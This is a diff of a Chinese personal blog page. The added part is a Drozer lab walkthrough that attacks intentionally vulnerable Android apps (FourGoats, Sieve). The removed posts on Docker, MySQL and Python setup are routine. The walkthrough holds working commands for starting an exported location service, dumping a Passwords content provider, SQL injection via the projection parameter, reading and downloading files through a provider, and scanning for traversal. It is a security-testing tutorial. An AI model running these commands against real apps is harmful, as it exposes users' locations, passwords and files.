+<p><img src="/aposts/2b1c1b8c/image-20220408195645407.png" alt="image-20220408195645407"></p>
+<h3 id="Services组件"><a href="#Services组件" class="headerlink" title="Services组件"></a>Services组件</h3><blockquote>
+<p>一个Service 是一段长生命周期的，没有用户界面的程序，可以用来开发如监控类程序。较好的一个例子就是一个正在从播放列表中播放歌曲的媒体播放器。在一个媒体播放器的应用中，应该会有多个activity，让使用者可以选择歌曲并播放歌曲。</p>
+</blockquote>
+<blockquote>
+<p>然而，音乐重放这个功能并没有对应的activity，因为使用者当然会认为在导航到其它屏幕时音乐应该还在播放的。在这个例子中，媒体播放器这个activity 会使用Context.startService()来启动一个service，从而可以在后台保持音乐的播放。同时，系统也将保持这个service 一直执行，直到这个service 运行结束。</p>
+</blockquote>
+<blockquote>
+<p>另外，我们还可以通过使用Context.bindService()方法，连接到一个service 上（如果这个service 还没有运行将启动它）。当连接到一个service 之后，我们还可以service 提供的接口与它进行通讯。拿媒体播放器这个例子来说，我们还可以进行暂停、重播等操作。 intent-filter未将exported设置为false，默认是可以导出的。</p>
+</blockquote>
+<p><img src="/aposts/2b1c1b8c/image-20220408195931828.png" alt="image-20220408195931828"></p>
+<ul>
+<li><code>org.owasp.fourgoats.goatdroid.LocationService</code>服务被导出，不需要任何权限。所以这意味着任何与<code>FourGoats</code>应用程序安装在设备上的恶意应用程序可以访问设备的位置。</li>
+</ul>
+<h4 id="让我们尝试启动特定服务"><a href="#让我们尝试启动特定服务" class="headerlink" title="让我们尝试启动特定服务"></a>让我们尝试启动特定服务</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.attacksurface org.owasp.goatdroid.fourgoats</span><br></pre></td></tr></table></figure>
+
+<p><img src="/aposts/2b1c1b8c/image-20220408200049130.png" alt="image-20220408200049130"></p>
+<ul>
+<li>查看services信息</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.service.info -a org.owasp.goatdroid.fourgoats</span><br></pre></td></tr></table></figure>
+
+<p><img src="/aposts/2b1c1b8c/image-20220408200401332.png" alt="image-20220408200401332"></p>
+<ul>
+<li>启动相关服务</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.service.start --action org.owasp.goatdroid.fourgoats.services.LocationService --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.services.LocationService</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>观察状态栏中的位置标志和GPS位置正在由FourGoats应用程序访问，<strong>这里我出现应用已停止的提示，贴人家攻击成功的图片</strong></li>
+</ul>
+<p><img src="/aposts/2b1c1b8c/image-20220408201610560.png" alt="image-20220408201610560"></p>
+<h3 id="Content组件"><a href="#Content组件" class="headerlink" title="Content组件"></a>Content组件</h3><blockquote>
+<p>android平台提供了Content Provider使一个应用程序的指定数据集提供给其他应用程序。这些数据可以存储在文件系统中、在一个SQLite数据库、或以任何其他合理的方式。其他应用可以通过ContentResolver类从该内容提供者中获取或存入数据。只有需要在多个应用程序间共享数据是才需要内容提供者。</p>
+</blockquote>
+<ul>
+<li>查看<code>fourgoats</code>该APP的可攻击点，可以看到存在<code>broadcast</code>广播问题。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.attacksurface org.owasp.goatdroid.fourgoats</span><br></pre></td></tr></table></figure>
+
+<p><img src="/aposts/2b1c1b8c/image-20220408202246019.png" alt="image-20220408202246019"></p>
+<h4 id="信息泄露利用"><a href="#信息泄露利用" class="headerlink" title="信息泄露利用"></a>信息泄露利用</h4><ul>
+<li>扫描并获取Content Provider信息，并列出了可访问内容URI的列表和路径：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run scanner.provider.finduris -a com.mwr.example.sieve</span><br><span class="line">Scanning com.mwr.example.sieve...</span><br><span class="line">Unable to Query  content://com.mwr.example.sieve.DBContentProvider/</span><br><span class="line">Unable to Query  content://com.mwr.example.sieve.FileBackupProvider/</span><br><span class="line">Unable to Query  content://com.mwr.example.sieve.DBContentProvider</span><br><span class="line">Able to Query    content://com.mwr.example.sieve.DBContentProvider/Passwords/</span><br><span class="line">Able to Query    content://com.mwr.example.sieve.DBContentProvider/Keys/</span><br><span class="line">Unable to Query  content://com.mwr.example.sieve.FileBackupProvider</span><br><span class="line">Able to Query    content://com.mwr.example.sieve.DBContentProvider/Passwords</span><br><span class="line">Unable to Query  content://com.mwr.example.sieve.DBContentProvider/Keys</span><br><span class="line"></span><br><span class="line">Accessible content URIs:</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/Keys/</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/Passwords</span><br><span class="line">  content://com.mwr.example.sieve.DBContentProvider/Passwords/</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查询或修改数据库中的数据，发现存在数据泄露问题，访问uri可看到一些敏感信息，</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/</span><br><span class="line">| _id | service | username | password | email |</span><br></pre></td></tr></table></figure>
+
+<p>我本人查到的是空数据，因为这个apk我还使用，因此没有任何数据，贴一个<strong>其他博客有数据的图片</strong></p>
+<p><img src="/aposts/2b1c1b8c/image-20220408203718126.png" alt="image-20220408203718126"></p>
+<h4 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h4><p>同样content可能导致注入问题。使用以下语句进行测试发现报错，说明存在SQL注入漏洞，直接注入了*号，查询到数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection  &quot;*&quot;</span><br><span class="line">| _id | service | username | password | email |</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>列出所有表信息</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot; </span><br></pre></td></tr></table></figure>
+
+<p><img src="/aposts/2b1c1b8c/image-20220408204237027.png" alt="image-20220408204237027"></p>
+<ul>
+<li><strong>同时也可以使用扫描功能对该app注入点位置进行扫描</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.injection -a  com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
+
+<p><img src="/aposts/2b1c1b8c/image-20220408204354777.png" alt="image-20220408204354777"></p>
+<ul>
+<li><strong>列出该app的表信息</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.sqltables -a  com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
+
+<p><img src="/aposts/2b1c1b8c/image-20220408204508903.png" alt="image-20220408204508903"></p>
+<h4 id="底层文件操作"><a href="#底层文件操作" class="headerlink" title="底层文件操作"></a>底层文件操作</h4><ul>
+<li>文件读取</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts </span><br></pre></td></tr></table></figure>
+
+<p><img src="/aposts/2b1c1b8c/image-20220408204701317.png" alt="image-20220408204701317"></p>
+<ul>
+<li>文件下载</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>文件下载没有执行成功，执行成功后应该回显以下内容：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/data/com.mwr.example.sieve/databases/database.db /home/user/database.db </span><br><span class="line">Written 24576 bytes</span><br></pre></td></tr></table></figure>
+
+<h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><ul>
+<li>目录遍历漏洞</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.traversal -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
+
+<p><img src="/aposts/2b1c1b8c/image-20220408204953757.png" alt="image-20220408204953757"></p>
+<p>更多Drozer使用方法可参阅官方指南（英文）：**<a target="_blank" rel="noopener" href="https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-drozer-user-guide-2015-03-23.pdf"> Drozer 使用指南</a>**</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://louis-me.github.io/aposts/453281b/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1534,552 +2098,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://louis-me.github.io/aposts/7ae40889/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="一个正经的测试工程师">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="施坤的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/aposts/7ae40889/" class="post-title-link" itemprop="url">docker实践mysql+python</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-03-18 11:07:20" itemprop="dateCreated datePublished" datetime="2022-03-18T11:07:20+08:00">2022-03-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-03-20 17:23:20" itemprop="dateModified" datetime="2022-03-20T17:23:20+08:00">2022-03-20</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/docker/" itemprop="url" rel="index"><span itemprop="name">docker</span></a>
-                </span>
-            </span>
-
-          
-            <span id="/aposts/7ae40889/" class="post-meta-item leancloud_visitors" data-flag-title="docker实践mysql+python" title="阅读次数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span class="leancloud-visitors-count"></span>
-            </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/aposts/7ae40889/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/aposts/7ae40889/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="mysql实践"><a href="#mysql实践" class="headerlink" title="mysql实践"></a>mysql实践</h2><ul>
-<li>本地环境（云服务器的本地路径）新建文件</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p ~/mysql/conf ~/mysql/data ~/mysql/logs</span><br><span class="line"># 用来挂载容器中mysql的conf、data、logs目录）</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>docker pull</code>镜像 安装 <code>mysql5.7 </code></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker pull mysql:5.7</span><br><span class="line"></span><br><span class="line">[root@VM-24-13-centos ~]# docker images</span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED        SIZE</span><br><span class="line">mysql         5.7       c20987f18b13   2 months ago   448MB</span><br><span class="line">hello-world   latest    feb5d9fea6a5   5 months ago   13.3kB</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>启动容器运行镜像</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 7777:3306 --name mysqltest --restart=always -v ~/mysql/conf:/etc/mysql/conf.d -v ~/mysql/data:/var/lib/mysql -v ~/mysql/logs:/logs -e MYSQL_ROOT_PASSWORD=root1234567 -d mysql:5.7</span><br><span class="line"></span><br><span class="line"># -p 7777:3306 ：容器内部端口3306映射到端口3306，既是稍后我们连接mysql用7777</span><br><span class="line"># --name ：运行的容器名称,每次为mysqltest</span><br><span class="line"># --restart always：开机启动</span><br><span class="line"># -v：如 ~/mysql/conf 对应容器的目录文件/etc/mysql/conf.d</span><br><span class="line"># -e MYSQL_ROOT_PASSWORD=root1234567：设置root的密码root1234567</span><br><span class="line"># -d 后台运行</span><br><span class="line"># mysql:5.7：既是运行这个镜像mysql:5.7</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>说明，还可以指定如下参数：</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--privileged=true：提升容器内权限</span><br><span class="line"> -e MYSQL_USER=”marvin”：添加用户marvin</span><br><span class="line"> -e MYSQL_PASSWORD=”pwd123”：设置marvin的密码伟pwd123</span><br><span class="line">--character-set-server=utf8：设置字符集为utf8</span><br><span class="line">--collation-server=utf8_general_ci：设置字符比较规则为utf8_general_ci</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>注意：如果运行时添加了marvin用户，用root登录后执行用户授权<code>ALTER USER &#39;marvin&#39;@&#39;%&#39; IDENTIFIED WITH mysql_native_password BY &#39;password123&#39;;</code>，才能用远程客户端访问数据库。</p>
-</blockquote>
-<ul>
-<li>使用客户端（<code>HeidiSQL</code>）连接，用户名为<code>root</code>，密码为<code>root1234567</code></li>
-</ul>
-<p><img src="/aposts/7ae40889/image-20220318145451272.png" alt="image-20220318145451272"></p>
-<ul>
-<li>连接成功后，创建数据库和表</li>
-</ul>
-<p><img src="/aposts/7ae40889/image-20220318151159402.png" alt="image-20220318151159402"></p>
-<ul>
-<li>在服务器也可采用如下命令进入容器内部</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> docker exec -it mysqltest mysql -uroot -proot1234567</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> mysql&gt; select * from demo.student;</span><br><span class="line">+----+------+------+---------+</span><br><span class="line">| id | name | sex  | address |</span><br><span class="line">+----+------+------+---------+</span><br><span class="line">|  1 | ??   | ?    | 22333   |</span><br><span class="line">+----+------+------+---------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-
-<h2 id="python实践"><a href="#python实践" class="headerlink" title="python实践"></a>python实践</h2><ul>
-<li>搜索python镜像：<code>docker search python3</code></li>
-</ul>
-<p><img src="/aposts/7ae40889/image-20220318160151482.png" alt="image-20220318160151482"></p>
-<ul>
-<li>拉取python3.7的镜像</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull rackspacedot/python37 </span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>拉取成功后可以看到镜像</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-24-13-centos ~]# docker images</span><br><span class="line">REPOSITORY              TAG       IMAGE ID       CREATED        SIZE</span><br><span class="line">rackspacedot/python37   latest    4513b6d75e1c   3 weeks ago    1.03GB</span><br><span class="line">mysql                   5.7       c20987f18b13   2 months ago   448MB</span><br><span class="line">hello-world             latest    feb5d9fea6a5   5 months ago   13.3kB</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>创建自己的脚本目录。自己的应用或文件一定要放在宿主机上，使用-v 选项将宿主机的某个目录映射到容器的某个目录下，不然容器删除时，自己的应用及文件有可能会丢失。</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /usr/local/python_proj</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>启动容器</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd -v /usr/local/python_proj:/usr/src/myapp -w /usr/src/myapp --name mypython-37 rackspacedot/python37</span><br><span class="line"># -itd 开启交互模式，为容器分配伪终端，在后台执行</span><br><span class="line"># -w  选项 为-w, --workdir=&quot;&quot;， 指定容器的工作目录为/usr/src/myapp</span><br><span class="line"># -v  选项将宿主机的/usr/local/python_pro录映射到容器的/usr/src/myapp目录</span><br><span class="line"># --name 容器名词</span><br><span class="line"># rackspacedot/python37 镜像名词</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>查看到已经启动成功：<code>docker ps</code></li>
-</ul>
-<p><img src="/aposts/7ae40889/image-20220318163618143.png" alt="image-20220318163618143"></p>
-<ul>
-<li>进入到容器查看python版本</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-24-13-centos ~]# docker exec -it mypython-37 python3 --version</span><br><span class="line">Python 3.7.11</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>在本机（宿主）脚本目录准备测试脚本</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/python_proj</span><br><span class="line">vi hello.py</span><br><span class="line"></span><br><span class="line">#!/usr/bin/python</span><br><span class="line">print(&quot;hello world!&quot;)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>运行结果</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-24-13-centos python_proj]#  docker exec -it mypython-37 python3 hello.py</span><br><span class="line">hello world!</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>pip</code> 安装模块，可以进入到容器中，然后直接安装模块</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 进入到容器中</span><br><span class="line">[root@VM-24-13-centos python_proj]# docker exec -it mypython-37 /bin/bash</span><br><span class="line">root@f471a7e4b8c8:/usr/src/myapp#  pip install requests</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>也可以不进容器，直接在宿主机上安装</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-24-13-centos python_proj]#  docker exec -it mypython-37 pip install requests</span><br><span class="line">Requirement already satisfied: requests in /usr/local/lib/python3.7/site-packages (2.27.1)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://louis-me.github.io/aposts/327177db/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="一个正经的测试工程师">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="施坤的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/aposts/327177db/" class="post-title-link" itemprop="url">docker安装</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-03-17 10:44:32" itemprop="dateCreated datePublished" datetime="2022-03-17T10:44:32+08:00">2022-03-17</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-03-30 11:49:25" itemprop="dateModified" datetime="2022-03-30T11:49:25+08:00">2022-03-30</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/docker/" itemprop="url" rel="index"><span itemprop="name">docker</span></a>
-                </span>
-            </span>
-
-          
-            <span id="/aposts/327177db/" class="post-meta-item leancloud_visitors" data-flag-title="docker安装" title="阅读次数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span class="leancloud-visitors-count"></span>
-            </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/aposts/327177db/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/aposts/327177db/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="什么是docker"><a href="#什么是docker" class="headerlink" title="什么是docker"></a>什么是docker</h2><ul>
-<li><p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903918372143112">这篇文章</a>对docker进行了比较详细的介绍，我抄录一些笔记</p>
-</li>
-<li><p><code>Docker</code>是容器技术的一种实现，也是操作系统层面的一种虚拟化，与虚拟机通过一套硬件再安装操作系统完全不同。</p>
-</li>
-</ul>
-<p><img src="/aposts/327177db/image-20220317105407328.png" alt="image-20220317105407328"></p>
-<ul>
-<li><code>Docker</code> 和虚拟机并不一样，<code>Docker</code>是在操作系统进程层面的隔离，而虚拟机是在物理资源层面的隔离，两者完全不同，另外，我们也可以通过下面的一个比较，了解两者的根本性差异。</li>
-</ul>
-<p><img src="/aposts/327177db/image-20220317105131805.png" alt="image-20220317105131805"></p>
-<h2 id="Docker的版本"><a href="#Docker的版本" class="headerlink" title="Docker的版本"></a>Docker的版本</h2><ul>
-<li><p><code>Docker</code>分为社区版(<code>CE</code>)和企业版(<code>EE</code>)两个版本，社区版本可以免费使用，而企业版则需要付费使用，对于我们个人开发者或小企业来说，一般是使用社区版的。</p>
-</li>
-<li><p><code>Docker CE</code>有三个更新频道，分别为<code>stable</code>、<code>test</code>、<code>nightly</code>，<code>stable</code>是稳定版本，<code>test</code>是测试后的预发布版本，而<code>nightly</code>则是开发中准备在下一个版本正式发布的版本，我们可以根据自己的需求下载安装。</p>
-</li>
-</ul>
-<h2 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h2><ul>
-<li>我自己购买的是某云的服务器，系统是centos7 64如下，docker官方说至少3.8以上，建议3.10以上</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-24-13-centos ~]# uname -a</span><br><span class="line">Linux VM-24-13-centos 3.10.0-1160.11.1.el7.x86_64 #1 SMP Fri Dec 18 16:34:56 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>更新yum包,需要时间可能会比较久，慢慢等就行了，生产环境慎重操作</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum update</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>修改yun-config的python版本为2</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi /usr/bin/yum-config-manager</span><br><span class="line"></span><br><span class="line">#!/usr/bin/python2 -tt</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>设置yum的源</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>安装docker</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install docker-ce</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>启动docker服务，后台运行</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start docker</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>更换国内源</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/docker/daemon.json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [</span><br><span class="line">    &quot;https://registry.docker-cn.com&quot;,</span><br><span class="line">    &quot;http://hub-mirror.c.163.com&quot;,</span><br><span class="line">    &quot;https://docker.mirrors.ustc.edu.cn&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>重启</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>查看是否设置成功</li>
-</ul>
